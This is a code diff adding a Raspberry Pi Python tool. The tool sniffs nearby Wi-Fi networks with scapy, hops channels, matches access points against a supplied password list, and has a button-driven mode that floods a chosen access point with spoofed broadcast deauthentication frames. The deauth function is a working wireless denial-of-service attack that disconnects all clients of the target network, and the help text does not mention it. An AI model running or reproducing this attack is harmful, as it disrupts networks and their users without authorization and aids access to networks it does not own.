@@ -1,0 +1,528 @@
+#!/usr/bin/env python
+
+import os
+import sys
+import time
+import RPi.GPIO as GPIO
+import atexit
+import threading
+
+from scapy.all import conf, sendp
+from scapy.layers.dot11 import RadioTap, Dot11, Dot11Deauth
+from scapy.all import *
+
+from threading import Thread
+from datetime import datetime
+from operator import itemgetter
+from colorama import Fore, Back, Style
+
+RST_PIN       = 25
+CS_PIN        = 8
+DC_PIN        = 24
+RST           = 27
+DC            = 25
+BL            = 24
+bus           = 0
+device        = 0
+KEY_UP_PIN    = 6
+KEY_DOWN_PIN  = 19
+KEY_LEFT_PIN  = 5
+KEY_RIGHT_PIN = 26
+KEY_PRESS_PIN = 13
+KEY1_PIN      = 21
+KEY2_PIN      = 20
+KEY3_PIN      = 16
+
+def gpio_setup():
+    GPIO.setmode(GPIO.BCM)
+    GPIO.setup(KEY_UP_PIN,    GPIO.IN, pull_up_down=GPIO.PUD_UP)
+    GPIO.setup(KEY_DOWN_PIN,  GPIO.IN, pull_up_down=GPIO.PUD_UP)
+    GPIO.setup(KEY_LEFT_PIN,  GPIO.IN, pull_up_down=GPIO.PUD_UP)
+    GPIO.setup(KEY_RIGHT_PIN, GPIO.IN, pull_up_down=GPIO.PUD_UP)
+    GPIO.setup(KEY_PRESS_PIN, GPIO.IN, pull_up_down=GPIO.PUD_UP)
+    GPIO.setup(KEY1_PIN,      GPIO.IN, pull_up_down=GPIO.PUD_UP)
+    GPIO.setup(KEY2_PIN,      GPIO.IN, pull_up_down=GPIO.PUD_UP)
+    GPIO.setup(KEY3_PIN,      GPIO.IN, pull_up_down=GPIO.PUD_UP)
+
+def checkRoot(): return os.geteuid() == 0
+
+term_show_count = 0
+g_tc = os.get_terminal_size().columns
+g_tl = os.get_terminal_size().lines
+def term_show_count_reset():
+    global term_show_count
+    term_show_count = 0
+def term_clear():
+    os.system("clear")
+    term_show_count_reset()
+def term_cursor_reset():
+    print("\033[0;0H", end='')
+    term_show_count_reset()
+def term_cursor_hide():
+    print("\033[?25l")
+def term_cursor_show():
+    print("\033[?25h")
+def term_blank():
+    term_cursor_hide()
+    term_clear()
+def term_show_print(printStr, color = ""):
+    global term_show_count
+    tl = os.get_terminal_size().lines
+    if term_show_count >= (tl-1): return
+    print(f"{color}{printStr}{Style.RESET_ALL}")
+    term_show_count += 1
+def term_show(s, color = ""):
+    global g_tc
+    global g_tl
+    strings = s.split("\n")
+    tc = os.get_terminal_size().columns
+    tl = os.get_terminal_size().lines
+    if g_tc != tc or g_tl != tl:
+        g_tc = tc
+        g_tl = tl
+        term_clear()
+    for i in strings:
+        il = len(i)
+        if il > tc: term_show_print(i[:tc], color)
+        else:       term_show_print(i + str(" " * int(int(tc)-int(il))), color)
+
+# exit handler
+@atexit.register
+def signal_handler():
+    term_cursor_show()
+
+# global stuff
+running = True
+status = str(datetime.now().strftime("%Y-%m-%d %H:%M:%S")) # UI status
+show_wifis   = True
+enable_wifis = True
+sleep_input = 0.2
+
+# wifi (beacon) table
+wifis = []
+wifi_clms = ["BSSID", "ESSID", "PASSWORD", "PWR", "LAST SEEN", "#", "CH", "CRYPTO", "TIMESTAMP", "PACKETS" ]
+wifi_clms_len = len(wifi_clms)
+wifi_clm_bssid     = 0
+wifi_clm_essid     = 1
+wifi_clm_passwd    = 2
+wifi_clm_pwr       = 3
+wifi_clm_lastseen  = 4
+wifi_clm_num       = 5
+wifi_clm_ch        = 6
+wifi_clm_crypto    = 7
+wifi_clm_timestamp = 8
+wifi_clm_packets   = 9
+
+sortBy = 5
+sortBy_reverse = False
+
+# globals
+interface = ""
+updateUI_mutex = threading.Lock()
+menu_mutex = threading.Lock()
+pauseUI_evt = threading.Event()
+pauseUI_evt.set()
+pauseCHHOP_evt = threading.Event()
+#pauseCHHOP_evt.set() # uncomment to enable ch hopper by default
+passwords = [] # password list from csv file /// BSSID, ESSID, PASSWORD
+passwords_count = 0
+passwords_count_matched = 0
+current_wifi = 0
+
+def loadPasswords(filePath):
+    global passwords
+    global passwords_count
+    f = open(filePath, 'r')
+    lines = f.readlines()
+    f.close()
+    for i_ in lines:
+        i = i_.replace("\n", "")
+        isplit = i.split("|||")
+        if len(isplit) >= 3:
+            passwords.append([isplit[0],isplit[1],isplit[2]])
+    passwords_count = len(passwords)
+
+# channels to use
+channels = [ 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13 ]
+ch = 1
+def channel_get():
+    global interface
+    return int(os.popen(f"iw '{interface}' info | grep channel").read().split()[1])
+def channel_set(i):
+    global interface
+    proc = subprocess.Popen(["sudo", "iw", "dev", interface, "set", "channel", str(i)])
+    os.waitpid(proc.pid, 0)
+
+def action_hopch():
+    found = False
+    isSet = False
+    global channels
+    global ch
+    while True:
+        for i in channels:
+            if found:
+                #ch = i
+                channel_set(i)
+                isSet = True
+                break
+            if i == ch:
+                found = True
+                continue
+        if isSet:
+            break
+def thread_getch():
+    global running
+    global ch
+    while running:
+        ch = channel_get()
+        time.sleep(0.5)
+def thread_hopch():
+    global running
+    while True:
+        if not pauseCHHOP_evt.is_set(): pauseCHHOP_evt.wait()
+        if not running: break
+        action_hopch()
+        time.sleep(1)
+
+def action_quit():
+    global running
+    running = False
+    pauseUI_evt.set()
+    pauseCHHOP_evt.set()
+    print("\n\nQuitting...")
+    #exit()
+def action_pauseUI():
+    global status
+    if pauseUI_evt.is_set():
+        pauseUI_evt.clear()
+        status = "PAUSED"
+    else:
+        pauseUI_evt.set()
+        status = "RESUMED"
+def action_pauseCHHOP():
+    global status
+    if pauseCHHOP_evt.is_set():
+        pauseCHHOP_evt.clear()
+        status = "PAUSED CHANNEL HOPPER"
+    else:
+        pauseCHHOP_evt.set()
+        status = "RESUMED CHANNEL HOPPER"
+def action_show_wifis():
+    global show_wifis
+    global status
+    show_wifis = (not show_wifis)
+    if show_wifis: status = "show wifis: on"
+    else:          status = "show wifis: off"
+def action_clear_wifis():
+    global status
+    global wifis
+    global current_wifi
+    wifis = []
+    status = "cleared wifi table"
+    current_wifi = 0
+def action_prevWifi():
+    global current_wifi
+    global wifis
+    current_wifi -= 1
+    if current_wifi < -1: current_wifi = -1
+def action_nextWifi():
+    global current_wifi
+    global wifis
+    current_wifi += 1
+    l = len(wifis)
+    if current_wifi > l: current_wifi = l
+
+menu_sort_running = False
+def menu_sort_prev():
+    global sortBy
+    sortBy -= 1
+    if sortBy < 0: sortBy = len(wifi_clms)-1
+def menu_sort_next():
+    global sortBy
+    sortBy += 1
+    if sortBy > len(wifi_clms)-1: sortBy = 0
+def menu_sort():
+    global menu_sort_running
+    global sortBy_reverse
+    menu_sort_running = True
+    while menu_sort_running:
+        if   not GPIO.input(KEY_UP_PIN):    sortBy_reverse = True
+        elif not GPIO.input(KEY_DOWN_PIN):  sortBy_reverse = False
+        elif not GPIO.input(KEY_LEFT_PIN):  menu_sort_prev()
+        elif not GPIO.input(KEY_RIGHT_PIN): menu_sort_next()
+        elif not GPIO.input(KEY_PRESS_PIN): menu_sort_running = False
+        time.sleep(sleep_input)
+
+menu_deauth_running = False
+menu_deauth_count = 0
+def menu_deauth_draw(cur):
+    term_cursor_reset()
+    term_show("")
+    term_show(f"CHANNEL: {str(ch).rjust(2)}" , f"{Style.BRIGHT}{Fore.YELLOW}")
+    term_show("")
+    term_show(f"BSSID: {cur[wifi_clm_bssid]}"     , f"{Style.BRIGHT}{Fore.CYAN}"  )
+    term_show(f"ESSID: {cur[wifi_clm_essid]}"     , f"{Style.BRIGHT}{Fore.GREEN}" )
+    term_show(f"PASS.: {cur[wifi_clm_passwd]}"    , f"{Style.BRIGHT}{Fore.RED}"   )
+    term_show(f"PWR..: {cur[wifi_clm_pwr]}"       , f"{Style.BRIGHT}{Fore.WHITE}" )
+    term_show(f"SEEN.: {cur[wifi_clm_lastseen]}"  , f"{Style.BRIGHT}{Fore.BLUE}"  )
+    term_show(f"#....: {cur[wifi_clm_num]}"       , f"{Style.BRIGHT}{Fore.YELLOW}")
+    term_show(f"CH...: {cur[wifi_clm_ch]}"        , f"{Style.BRIGHT}{Fore.GREEN}" )
+    term_show(f"CRYP.: {cur[wifi_clm_crypto]}"    , f"{Style.BRIGHT}{Fore.RED}"   )
+    term_show(f"STAMP: {cur[wifi_clm_timestamp]}" , f"{Style.BRIGHT}{Fore.WHITE}" )
+    term_show(f"RECV.: {cur[wifi_clm_packets]}"   , f"{Style.BRIGHT}{Fore.WHITE}" )
+    term_show("")
+    term_show(f"DEAUTHS: {menu_deauth_count}" , f"{Style.BRIGHT}{Fore.RED}")
+def menu_deauth_deauth(packet):
+    global menu_deauth_count
+    sendp(packet)
+    menu_deauth_count += 1
+def menu_deauth():
+
+    # return if selection is wrong
+    lw = len(wifis)
+    if (lw == 0) or (current_wifi == lw): return
+
+    # set stuff
+    global menu_deauth_running
+    global menu_deauth_count
+    menu_deauth_running = True
+    menu_deauth_count = 0
+
+    # pause stuff
+    res1 = False
+    res2 = False
+    if pauseUI_evt.is_set():
+        pauseUI_evt.clear()
+        res1 = True
+    if pauseCHHOP_evt.is_set():
+        pauseCHHOP_evt.clear()
+        res2 = True
+
+    # get current wifi
+    wifis_sorted = sorted(wifis, key=itemgetter(sortBy), reverse=sortBy_reverse)
+    cur = wifis_sorted[current_wifi]
+
+    # set channel
+    channel_set(cur[wifi_clm_ch])
+
+    # craft packet
+    conf.verb = 0
+    conf.iface = interface
+    packet = RadioTap() / Dot11(type=0, subtype=12, addr1="FF:FF:FF:FF:FF:FF", addr2=cur[wifi_clm_bssid], addr3=cur[wifi_clm_bssid]) / Dot11Deauth(reason=7)
+
+    # draw current wifi
+    term_clear()
+    menu_deauth_draw(cur)
+
+    while menu_deauth_running:
+        if not GPIO.input(KEY1_PIN):
+            menu_deauth_deauth(packet)
+            menu_deauth_draw(cur)
+        elif not GPIO.input(KEY2_PIN):
+            while True:
+                menu_deauth_deauth(packet)
+                menu_deauth_draw(cur)
+                if not GPIO.input(KEY3_PIN): break
+        elif not GPIO.input(KEY_PRESS_PIN): menu_deauth_running = False
+        elif not GPIO.input(KEY_LEFT_PIN): menu_deauth_draw(cur)
+        time.sleep(sleep_input)
+    
+    # resume
+    term_clear()
+    if res1: pauseUI_evt.set()
+    if res2: pauseCHHOP_evt.set()
+
+def updateUI():
+
+    updateUI_mutex.acquire()
+
+    # get/set vars
+    global ch
+    global term_show_count
+    global current_wifi
+    timestr = str(datetime.now())
+    len_wifis = len(wifis)
+    arrowChar = "\u2193"
+    if sortBy_reverse: arrowChar = "\u2191"
+    term_cursor_reset() # set print pos to 0x0
+    term_show_count = 0 # reset show counter
+
+    # display stuff
+    global g_tl
+    global g_tc
+    term_show(f"{str(timestr).ljust(26)}"                                                                     , f"{Style.BRIGHT}{Fore.MAGENTA}")
+    term_show(f"CHANNEL: {str(ch).rjust(2)}"                                                                  , f"{Style.BRIGHT}{Fore.YELLOW}")
+    if menu_sort_running: term_show(f"SORT BY: {arrowChar} {wifi_clms[sortBy]} <=="                           , f"{Style.BRIGHT}{Fore.WHITE}")
+    else:                 term_show(f"SORT BY: {arrowChar} {wifi_clms[sortBy]}"                               , f"{Style.BRIGHT}{Fore.BLUE}")
+    term_show(f"{current_wifi} / {len_wifis-1} ({len_wifis}) | {passwords_count} ({passwords_count_matched})" , f"{Style.BRIGHT}{Fore.GREEN}")
+    term_show(f"> {status}"                                                                                   , f"{Style.BRIGHT}{Fore.WHITE}")
+
+    wifis_sorted = sorted(wifis, key=itemgetter(sortBy), reverse=sortBy_reverse)
+
+    if len(wifis) > 0:
+        try:
+            term_show(f"BSSID: {wifis_sorted[current_wifi][wifi_clm_bssid]}"     , f"{Style.BRIGHT}{Fore.CYAN}"  )
+            term_show(f"ESSID: {wifis_sorted[current_wifi][wifi_clm_essid]}"     , f"{Style.BRIGHT}{Fore.GREEN}" )
+            term_show(f"PASS.: {wifis_sorted[current_wifi][wifi_clm_passwd]}"    , f"{Style.BRIGHT}{Fore.RED}"   )
+            term_show(f"PWR..: {wifis_sorted[current_wifi][wifi_clm_pwr]}"       , f"{Style.BRIGHT}{Fore.WHITE}" )
+            term_show(f"SEEN.: {wifis_sorted[current_wifi][wifi_clm_lastseen]}"  , f"{Style.BRIGHT}{Fore.BLUE}"  )
+            term_show(f"#....: {wifis_sorted[current_wifi][wifi_clm_num]}"       , f"{Style.BRIGHT}{Fore.YELLOW}")
+            term_show(f"CH...: {wifis_sorted[current_wifi][wifi_clm_ch]}"        , f"{Style.BRIGHT}{Fore.GREEN}" )
+            term_show(f"CRYP.: {wifis_sorted[current_wifi][wifi_clm_crypto]}"    , f"{Style.BRIGHT}{Fore.RED}"   )
+            term_show(f"STAMP: {wifis_sorted[current_wifi][wifi_clm_timestamp]}" , f"{Style.BRIGHT}{Fore.WHITE}" )
+            term_show(f"RECV.: {wifis_sorted[current_wifi][wifi_clm_packets]}"   , f"{Style.BRIGHT}{Fore.WHITE}" )
+        except:
+            term_show("\n"*10)
+            pass
+
+    updateUI_mutex.release()
+def thread_updateUI():
+    global running
+    while True:
+        if not pauseUI_evt.is_set(): pauseUI_evt.wait()
+        if not running: break
+        updateUI()
+        time.sleep(0.1)
+
+def crypto2str(cl):
+    return ','.join(cl)
+
+def callback(packet):
+    if packet.haslayer(Dot11Beacon):
+        bssid = packet[Dot11].addr2.upper()
+        essid = packet[Dot11Elt].info.decode()
+        try:    dbm_signal = packet.dBm_AntSignal
+        except: dbm_signal = ""
+        stats = packet[Dot11Beacon].network_stats()
+        channel = stats.get("channel")
+        crypto  = stats.get("crypto")
+        timestamp = packet[Dot11Beacon].timestamp
+        lastseen =  datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+        passwd = ""
+
+        # check if wifi exists
+        hasWifi = False
+        index = 0
+        for i in range(0, len(wifis)):
+            index = i
+            if wifis[i][wifi_clm_bssid] == bssid:
+                hasWifi = True
+                break
+
+        lst = [None] * wifi_clms_len
+        lst[wifi_clm_bssid]     = bssid
+        lst[wifi_clm_essid]     = essid
+        lst[wifi_clm_pwr]       = dbm_signal
+        lst[wifi_clm_lastseen]  = lastseen
+        lst[wifi_clm_ch]        = channel
+        lst[wifi_clm_crypto]    = crypto2str(crypto)
+        lst[wifi_clm_timestamp] = timestamp
+
+        if hasWifi:
+            lst[wifi_clm_num]     = wifis[index][wifi_clm_num]
+            lst[wifi_clm_packets] = wifis[index][wifi_clm_packets]+1
+            lst[wifi_clm_passwd]  = wifis[index][wifi_clm_passwd]
+            wifis[index] = lst
+        else:
+            global passwords_count
+            global passwords_count_matched
+            if passwords_count:
+                global passwords
+                for i in passwords:
+                    match_bssid = str(bssid).replace(":", "").replace("-", "").lower()
+                    match_i     =  str(i[0]).replace(":", "").replace("-", "").lower()
+                    if match_bssid == match_i and essid == i[1]:
+                        passwd = i[2]
+                        passwords_count_matched += 1
+                        break
+            lst[wifi_clm_num]     = len(wifis)+1
+            lst[wifi_clm_packets] = 1
+            lst[wifi_clm_passwd]  = passwd
+            wifis.append(lst)
+
+        return # close if
+
+def menu(keyPress):
+    if   keyPress == 1: action_hopch()
+    elif keyPress == 2: action_pauseCHHOP()
+    elif keyPress == 3: action_prevWifi()
+    elif keyPress == 4: action_nextWifi()
+    elif keyPress == 5: action_pauseUI()
+    elif keyPress == 6: action_quit() ; return
+    elif keyPress == 7: menu_sort()
+    elif keyPress == 8: menu_deauth()
+    #term_clear()
+    updateUI()
+
+if __name__ == "__main__":
+
+    try:
+
+        argv_len = len(sys.argv)
+
+        if argv_len < 2:
+            print("ABOUT: uses scapy to show nearby networks,")
+            print("       (optional) and trys to match them with the csv password list")
+            print("USAGE: " + sys.argv[0] + " <interface(mon)> <wifipasslst.csv(optional)>")
+            print("KEY COMMANDS:")
+            print("      q - quit")
+            print("      s - change sorting")
+            print("      d - change sorting order")
+            print("  SPACE - pause")
+            print("      c - hop channel")
+            print("      C - toggle auto channel hopper")
+            print("      w - show wifi table")
+            print("      W - clear wifi table")
+            print("      j - back")
+            print("      k - forward")
+            print("")
+            exit()
+
+        if not checkRoot():
+            print("use root.")
+            exit()
+
+        interface = sys.argv[1]
+        if argv_len >= 3: loadPasswords(sys.argv[2])
+
+        # clear screen and hide cursor
+        term_blank()
+
+        # threads (print / channel hopper)
+        th_ui  = Thread(target=thread_updateUI)
+        th_ui.daemon = True
+        th_ch = Thread(target=thread_getch)
+        th_ch.daemon = True
+        th_hop = Thread(target=thread_hopch)
+        th_hop.daemon = True
+        th_ui.start()
+        th_ch.start()
+        th_hop.start()
+
+        # start sniffing
+        th_sniff = AsyncSniffer(prn=callback, iface=interface)
+        th_sniff.start()
+
+        # setup pi gpio
+        gpio_setup()
+
+        while running:
+            if   not GPIO.input(KEY_UP_PIN):    menu(1)
+            elif not GPIO.input(KEY_DOWN_PIN):  menu(2)
+            elif not GPIO.input(KEY_LEFT_PIN):  menu(3)
+            elif not GPIO.input(KEY_RIGHT_PIN): menu(4)
+            elif not GPIO.input(KEY_PRESS_PIN): menu(5)
+            elif not GPIO.input(KEY1_PIN):      menu(6)
+            elif not GPIO.input(KEY2_PIN):      menu(7)
+            elif not GPIO.input(KEY3_PIN):      menu(8)
+            time.sleep(sleep_input)
+
+        th_ui.join()
+        th_hop.join()
+
+    except KeyboardInterrupt:
+        action_quit()
+    except Exception as e:
+        if hasattr(e, 'message'): print(e.message,e.line)
+        else: print(e)
+        action_quit()
